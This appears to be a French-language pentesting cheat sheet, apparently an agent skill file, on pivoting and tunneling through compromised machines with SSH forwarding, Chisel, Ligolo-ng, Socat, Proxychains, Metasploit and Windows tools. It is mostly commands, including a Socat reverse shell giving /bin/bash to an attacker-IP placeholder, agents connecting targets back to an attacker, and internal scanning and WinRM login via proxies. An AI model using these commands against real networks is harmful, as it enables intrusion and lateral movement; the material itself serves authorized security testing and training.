---
name: pivoting-tunneling
description: Guide complet de pivoting et tunneling — Chisel, Ligolo-ng, SSH port forwarding, SSHuttle, Socat, Proxychains, double pivoting, et techniques de rebond réseau.
---

# Pivoting & Tunneling — Guide Complet

---

## Concepts clés

| Terme | Définition |
|-------|-----------|
| **Port forwarding** | Rediriger un port local vers une cible distante |
| **Pivoting** | Utiliser une machine compromise pour attaquer un réseau interne |
| **Tunneling** | Encapsuler du trafic dans un autre protocole |
| **SOCKS proxy** | Proxy générique TCP (navigateur, proxychains) |

---

## 1. SSH Local Port Forwarding

Redirige un port local vers une cible accessible depuis le pivot.

```bash
# Syntaxe : ssh -L <port_local>:<cible>:<port_cible> user@pivot
# Exemple : accéder à un serveur web interne 192.168.1.10:80
ssh -L 8080:192.168.1.10:80 user@<IP_PIVOT>
# Puis localhost:8080 → redirect vers 192.168.1.10:80 via le pivot
```

## 2. SSH Remote Port Forwarding

Expose un port du réseau de la cible vers notre machine.

```bash
# Sur la cible (reverse) : expose son port 3389 sur notre port 3390
ssh -R 3390:localhost:3389 user@<IP_ATTAQUANT>
```

## 3. SSH Dynamic Port Forwarding (SOCKS)

Crée un proxy SOCKS pour tout le trafic.

```bash
# SOCKS proxy sur le port 1080
ssh -D 1080 user@<IP_PIVOT>

# Configurer /etc/proxychains4.conf :
# socks4 127.0.0.1 1080

# Utiliser
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains crackmapexec smb 192.168.1.100
```

## 4. SSHuttle — VPN-like via SSH

Route tout le trafic vers des sous-réseaux via SSH.

```bash
# Installer
apt install sshuttle

# Router tout le trafic vers 192.168.1.0/24 via le pivot
sshuttle -r user@<IP_PIVOT> 192.168.1.0/24

# Avec clé SSH
sshuttle -r user@<IP_PIVOT> 192.168.1.0/24 -e "ssh -i id_rsa"

# Exclure certains sous-réseaux
sshuttle -r user@<IP_PIVOT> 0.0.0.0/0 -x 10.0.0.0/8 -x 172.16.0.0/12
```

---

## 5. Chisel — Tunnel TCP/HTTP via WebSocket

Parfait quand seul le trafic HTTP sortant est autorisé.

```bash
# Sur l'attaquant (serveur)
chisel server -p 8080 --reverse

# Sur la cible (client) — forward de port simple
chisel client <IP_ATTAQUANT>:8080 R:8443:localhost:443

# Sur la cible (client) — SOCKS proxy
chisel client <IP_ATTAQUANT>:8080 R:socks

# Puis utiliser proxychains
proxychains nmap -sT 172.16.0.0/24

# Version Windows (chisel.exe) fonctionne pareil
```

---

## 6. Ligolo-ng — Pivoting niveau TUN (recommandé moderne)

Interface TUN virtuelle = routage comme si on était sur le réseau interne.

```bash
# === SUR L'ATTAQUANT (Kali) ===

# Créer l'interface TUN
sudo ip tuntap add user kali mode tun ligolo

# Activer l'interface
sudo ip link set ligolo up
sudo ip route add 240.0.0.1 dev ligolo

# Lancer le proxy
./proxy -selfcert

# session → sélectionner la session
ligolo-ng » session

# Démarrer le tunnel
ligolo-ng » start

# Ajouter la route vers le réseau interne
sudo ip route add 192.168.1.0/24 dev ligolo

# === SUR LA CIBLE ===
./agent -connect <IP_ATTAQUANT>:11601 -ignore-cert
```

### Ligolo-ng — Double pivoting
```bash
# Créer une seconde interface
sudo ip tuntap add user kali mode tun ligolo2
sudo ip link set ligolo2 up

# Dans ligolo (session pivot 1)
ligolo-ng » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp

# Sur la 2e cible
./agent -connect <IP_PIVOT1>:11602 -ignore-cert

# Nouvelle session → tunnel_start --tun ligolo2
# Route vers le 3e réseau
sudo ip route add 10.1.30.0/24 dev ligolo2
```

---

## 7. Socat — Couteau suisse de la redirection

```bash
# Port forwarding simple
socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80

# Encrypted tunnel (SSL)
# Attaquant :
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0,fork TCP:localhost:80
# Cible :
socat TCP:192.168.1.10:80 OPENSSL-CONNECT:<IP_ATTAQUANT>:443,verify=0

# Reverse shell via socat
# Attaquant :
socat TCP-LISTEN:4444 -
# Cible :
socat TCP:<IP_ATTAQUANT>:4444 EXEC:/bin/bash
```

---

## 8. Proxychains — Configuration

```bash
# /etc/proxychains4.conf
[ProxyList]
socks4 127.0.0.1 1080    # SSH dynamic
socks5 127.0.0.1 1080    # Chisel SOCKS

# Utilisation
proxychains nmap -sT -Pn -p 80,443,445 192.168.1.0/24
proxychains crackmapexec smb 192.168.1.100
proxychains evil-winrm -i 192.168.1.100 -u admin -p pass
proxychains firefox            # Lancer le navigateur via proxy
```

---

## 9. Metasploit — Pivoting / Autoroute

```bash
# Depuis un shell Meterpreter
meterpreter » run autoroute -s 192.168.1.0/24
meterpreter » background

# Scanner via Metasploit
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 80,443,445,3389
run

# Port forward depuis Meterpreter
meterpreter » portfwd add -l 8080 -p 80 -r 192.168.1.10

# SOCKS proxy Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
# Puis proxychains configuré sur 127.0.0.1:1080
```

---

## 10. Rpivot — Reverse SOCKS via HTTP

```bash
# Serveur (attaquant)
python rpivot.py --server-ip 0.0.0.0 --server-port 9999 --proxy-port 1080

# Client (cible)
python rpivot.py --client-ip <IP_ATTAQUANT> --client-port 9999
```

---

## 11. Plink (Windows) — SSH forwarding

```cmd
# Télécharger plink.exe
plink.exe -l user -pw password -R 3390:127.0.0.1:3389 <IP_ATTAQUANT>
```

---

## 12. Netsh (Windows natif) — Port forwarding

```cmd
# Ajouter une règle de forwarding
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.10

# Lister les règles
netsh interface portproxy show all

# Supprimer
netsh interface portproxy delete v4tov4 listenport=8080
```

---

## Arbre de décision rapide

```
Je veux accéder à un réseau interne via un pivot...

1. SSH disponible ?
   → ssh -D 1080 user@pivot + proxychains (le plus simple)

2. Seulement HTTP(S) sortant ?
   → Chisel (WebSocket) ou Ligolo-ng

3. Besoin de tout le sous-réseau comme si j'étais dedans ?
   → Ligolo-ng (TUN) ou SSHuttle

4. Port unique à forwarder ?
   → SSH -L ou Socat

5. Windows uniquement ?
   → netsh (natif) ou chisel.exe ou plink.exe

6. Déjà un shell Meterpreter ?
   → autoroute + portfwd
```

### Ressources
- **Ligolo-ng** : https://github.com/nicocha30/ligolo-ng
- **Chisel** : https://github.com/jpillora/chisel
- **Socat** : https://github.com/3ndG4me/socat
- **PayloadsAllTheThings (Pivoting)** : https://github.com/swisskyrepo/PayloadsAllTheThings